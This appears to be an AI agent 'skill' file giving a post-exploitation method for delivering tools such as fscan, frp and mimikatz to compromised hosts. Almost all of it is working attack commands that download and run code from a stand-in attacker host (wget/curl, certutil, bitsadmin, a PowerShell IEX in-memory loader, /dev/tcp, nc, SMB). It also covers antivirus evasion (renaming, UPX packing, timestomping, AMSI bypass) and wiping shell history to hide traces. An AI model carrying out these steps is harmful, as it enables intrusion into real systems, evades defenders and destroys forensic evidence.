---
name: tool-delivery
description: "Methodology for delivering tools and files to a compromised target host. Use once you already have a shell, webshell, or RCE and need to transfer tools such as fscan, frp, chisel, linpeas, or mimikatz to the target for execution. Covers file transfer techniques across Linux and Windows (wget/curl/certutil/bitsadmin/PowerShell/python/nc/base64/SMB, etc.), why tools should run on the target rather than locally, how to handle targets with no outbound connectivity, how to evade antivirus detection, and post-execution trace cleanup. Use this skill for any scenario involving 'transferring a file to the target', 'running a scanner on the target', 'internal tool delivery', or 'dropping a file'"
zh-signals: "向已控目标主机投递并执行 fscan、frp、linpeas 等工具的方法。信号:工具投递,文件传输,后渗透,内网工具,落地执行"
when-to-use: >-
  Use after obtaining shell, webshell, or RCE access when tools must be transferred to and executed on a target host across Linux or Windows.
metadata:
  tags: "tool-delivery,file-transfer,upload,transfer,delivery,dropping,wget,curl,certutil,scp,base64,internal-network,postexploit,file-transfer"
  category: "postexploit"
---

# Tool Delivery Methodology

After gaining access to a target, the next step is usually to deliver tools (fscan, frp, chisel, linpeas, winPEAS, mimikatz, etc.) to the target and execute them there. This step may look simple, but the method chosen directly affects the success rate and stealth.

## Arsenal Repository

Precompiled multi-platform binaries are stored in the `/pentest/arsenal/` directory (the path can be customized via the `arsenal_dir` field in config.yaml), organized into one subdirectory per tool, and each subdirectory contains build variants for three platforms: linux_amd64, linux_arm64, and windows_amd64:

```bash
ls /pentest/arsenal/
# fscan/  gogo/  zombie/  spray/  cdk/  iox/  frpc/  chisel/

ls /pentest/arsenal/fscan/
# fscan_linux_amd64  fscan_linux_arm64  fscan_windows_amd64.exe
```

Pick the correct binary for the target platform before delivery:
```bash
# Confirm the target architecture
uname -m   # Linux: x86_64 → amd64, aarch64 → arm64
# Windows: echo %PROCESSOR_ARCHITECTURE%  → AMD64

# Serve the matching variant from the arsenal
python3 -m http.server 8888 --directory /pentest/arsenal/fscan/
```

## Core Principle: Why Execute on the Target

Running tools locally through a proxy tunnel versus transferring them to the target and running them there is not an arbitrary choice:

| Factor | Run locally through a tunnel | Run directly on the target |
|------|------------------|----------------|
| Network traffic | All scan traffic goes through the tunnel, bandwidth limited | Traffic originates from the target directly, no bottleneck |
| ICMP | SOCKS5 does not support ICMP, so liveness probing fails | ICMP packets are sent normally, liveness probing works |
| UDP | SOCKS5 usually does not support UDP | Normal UDP communication |
| Speed | Constrained by both tunnel bandwidth and latency | Direct internal connection, millisecond latency |
| Stability | Tunnel drop = interrupted scan | No dependency on the tunnel |
| Stealth | Abnormal traffic pattern (bulk data over a single tunnel) | Looks like normal internal network traffic |
| Risk | No risk of tools landing on disk | Tool binaries may be detected by AV |

**Conclusion: internal scanning and brute-force tools (fscan, nmap, masscan) should almost always be transferred to and executed on the target.** Only lightweight one-off requests (a single curl, a DNS lookup) are better done locally through a tunnel.

AV detection risk on Linux is typically very low (most Linux servers have no EDR), so the delivery risk can be ignored there. On Windows, more caution is required — see the antivirus section below.

## Decision Tree: Choosing a Transfer Method

```
Can the target reach the internet?
├─ Yes → Does the target have wget/curl?
│       ├─ Yes → wget/curl download from the attacker HTTP server (fastest, simplest)
│       └─ No → Does the target have python?
│               ├─ Yes → download with python urllib
│               └─ No → Target is Linux → /dev/tcp or base64 pipe
│                        Target is Windows → certutil / bitsadmin / PowerShell
├─ No (no outbound access) → Is there a tunnel/proxy?
│       ├─ Yes → scp / reverse HTTP download through the tunnel
│       └─ No → Is there a webshell?
│               ├─ Yes → webshell file upload function
│               └─ No → write via base64 encoding through RCE → decode
└─ Special → Target runs in a K8s Pod / Docker container
         → kubectl cp / docker cp
```

## Linux File Transfer

### Method 1: wget / curl (preferred, most common)

Start an HTTP server on the attacker machine:
```bash
# Attacker: serve the tools directory over HTTP
cd /path/to/tools
python3 -m http.server 8888
# Or bind a specific address
python3 -m http.server 8888 --bind 0.0.0.0
```

Download on the target:
```bash
# wget (most common, present on nearly every Linux distribution)
wget http://ATTACKER:8888/fscan -O /tmp/fscan && chmod +x /tmp/fscan

# curl (macOS ships with curl but no wget)
curl http://ATTACKER:8888/fscan -o /tmp/fscan && chmod +x /tmp/fscan

# curl silent mode
curl -sO http://ATTACKER:8888/fscan && chmod +x fscan
```

### Method 2: Python Download

```bash
python3 -c "import urllib.request; urllib.request.urlretrieve('http://ATTACKER:8888/fscan', '/tmp/fscan')"
python2 -c "import urllib; urllib.urlretrieve('http://ATTACKER:8888/fscan', '/tmp/fscan')"
```

### Method 3: nc (Netcat) Transfer

No HTTP server required, suitable for minimal environments:
```bash
# Attacker (sender)
nc -lvp 4444 < fscan

# Target (receiver)
nc ATTACKER 4444 > /tmp/fscan
chmod +x /tmp/fscan
```

Reverse mode (the target cannot reach the attacker, but the attacker can reach the target):
```bash
# Target (listening)
nc -lvp 4444 > /tmp/fscan

# Attacker (connects and sends)
nc TARGET 4444 < fscan
```

### Method 4: /dev/tcp (Bash built-in, no external tools needed)

When the target runs a minimal environment (busybox, docker containers, etc.) without wget/curl/nc:
```bash
# Attacker starts an nc listener
nc -lvp 4444 < fscan

# Target receives with the bash built-in
cat < /dev/tcp/ATTACKER/4444 > /tmp/fscan
chmod +x /tmp/fscan
```

### Method 5: base64 Encoding Transfer (written through RCE/webshell)

The last-resort option when the target has no outbound access and only command execution through a vulnerability is possible:
```bash
# Attacker: encode
base64 -w0 fscan > fscan.b64
# Split large files into chunks
split -b 50000 fscan.b64 chunk_

# Target: write chunk by chunk, then decode
echo 'BASE64_CHUNK_1' >> /tmp/fscan.b64
echo 'BASE64_CHUNK_2' >> /tmp/fscan.b64
base64 -d /tmp/fscan.b64 > /tmp/fscan
chmod +x /tmp/fscan
md5sum /tmp/fscan  # verify integrity
```

This method is slow but universal — as long as commands can be executed, files can be transferred. For large files (>1MB), chunk them to avoid command-line length limits.

### Method 6: SCP / SFTP (when SSH credentials are available)

```bash
# Push from the attacker to the target
scp fscan user@TARGET:/tmp/fscan
scp -i id_rsa fscan user@TARGET:/tmp/fscan

# Through a jump host
scp -o ProxyJump=user@JUMP fscan user@TARGET:/tmp/fscan
```

## Windows File Transfer

### Method 1: certutil (LOLBin, built into the system)

```cmd
certutil -urlcache -split -f http://ATTACKER:8888/tool.exe C:\Windows\Temp\tool.exe
```
certutil is a certificate utility, but it can download arbitrary files. Antivirus may monitor this command, yet it still works in many environments.

### Method 2: PowerShell

```powershell
# Download a file
Invoke-WebRequest -Uri http://ATTACKER:8888/tool.exe -OutFile C:\Windows\Temp\tool.exe

# Shorthand
iwr http://ATTACKER:8888/tool.exe -o C:\Windows\Temp\tool.exe

# .NET method (lower level, sometimes bypasses policy)
(New-Object Net.WebClient).DownloadFile('http://ATTACKER:8888/tool.exe','C:\Windows\Temp\tool.exe')

# In-memory execution (no file on disk, for PowerShell scripts)
IEX (New-Object Net.WebClient).DownloadString('http://ATTACKER:8888/script.ps1')
```

### Method 3: bitsadmin (built-in background download)

```cmd
bitsadmin /transfer job /download /priority high http://ATTACKER:8888/tool.exe C:\Windows\Temp\tool.exe
```
BITS is the background transfer service used by Windows Update, making it stealthier than certutil.

### Method 4: SMB Share (preferred for internal transfers)

```cmd
:: Attacker starts an SMB share (using impacket)
:: python3 smbserver.py share /path/to/tools -smb2support

:: Target executes directly (nothing lands on disk!)
\\ATTACKER\share\tool.exe

:: Or copy it over
copy \\ATTACKER\share\tool.exe C:\Windows\Temp\tool.exe
```
SMB looks very natural in an internal environment and rarely triggers alerts.

### Method 5: base64 + PowerShell

```powershell
# Attacker encodes
$bytes = [IO.File]::ReadAllBytes("tool.exe")
[Convert]::ToBase64String($bytes) | Out-File tool.b64

# Target decodes
$b64 = "BASE64_STRING_HERE"
[IO.File]::WriteAllBytes("C:\Windows\Temp\tool.exe", [Convert]::FromBase64String($b64))
```

### Method 6: FTP

```cmd
:: Attacker: python3 -m pyftpdlib -p 21
ftp -s:commands.txt
:: commands.txt content:
:: open ATTACKER
:: anonymous
:: binary
:: get tool.exe
:: bye
```

## Antivirus Evasion

### Linux
Linux servers rarely have AV/EDR. If one is present, consider:
- Change directory: `/dev/shm/` (in-memory filesystem, no disk writes), `/tmp/`, `/var/tmp/`
- Rename: do not use the original tool name (fscan → a random name such as `svc_check`)
- Delete immediately after execution: `./tool args; rm -f tool`
- memfd fileless execution (advanced): load through `/proc/self/fd/`

### Windows
AV detection is stricter on Windows, so more techniques are needed:
- **Rename**: `mimikatz.exe` → `svc_diag.exe`
- **Change directory**: `C:\Windows\Temp\`, `C:\ProgramData\`, the user Temp directory
- **UPX packing**: `upx -9 tool.exe` changes the file hash
- **Timestamp forgery**: use `timestomp` to modify the file times
- **SMB remote execution** (nothing on disk): run `\\share\tool.exe` directly
- **PowerShell in-memory loading**: `IEX` downloads the string and executes it without writing a file
- **AMSI bypass**: when a PowerShell script is blocked, AMSI must be bypassed first

## Trace Cleanup

After the tool has run, clean up:
```bash
# Linux
rm -f /tmp/fscan /tmp/result.txt
# If executed from /dev/shm, it is cleared automatically on reboot
# Clear bash_history
history -c && unset HISTFILE
# Or delete the specific entries
sed -i '/fscan/d' ~/.bash_history

# Windows
del /f C:\Windows\Temp\tool.exe
del /f C:\Windows\Temp\result.txt
# Clear PowerShell history
Remove-Item (Get-PSReadlineOption).HistorySavePath
```

## Real-World Workflow Examples

### Scenario: Delivering fscan Through a Webshell for an Internal Scan

```
Step 1: Attacker starts an HTTP server
  python3 -m http.server 8888

Step 2: Run the download command through the webshell
  wget http://VPS:8888/fscan -O /tmp/.s && chmod +x /tmp/.s

Step 3: Run the scan
  /tmp/.s -h 10.0.0.0/24 -o /tmp/.r

Step 4: Read the results
  cat /tmp/.r  (read through the webshell)

Step 5: Clean up
  rm -f /tmp/.s /tmp/.r
```

### Scenario: Transferring a Tool via base64 in an Environment with No Outbound Access

```
Step 1: Attacker encodes
  base64 -w0 fscan | head -c 50000   # check the size to estimate the number of chunks

Step 2: Write the chunks (through the RCE vulnerability)
  echo 'CHUNK1...' > /tmp/.b
  echo 'CHUNK2...' >> /tmp/.b

Step 3: Decode and execute
  base64 -d /tmp/.b > /tmp/.s && chmod +x /tmp/.s
  md5sum /tmp/.s  # verify

Step 4: Execute + clean up
  /tmp/.s -h 10.0.0.0/24 -o /tmp/.r && rm -f /tmp/.s /tmp/.b
```
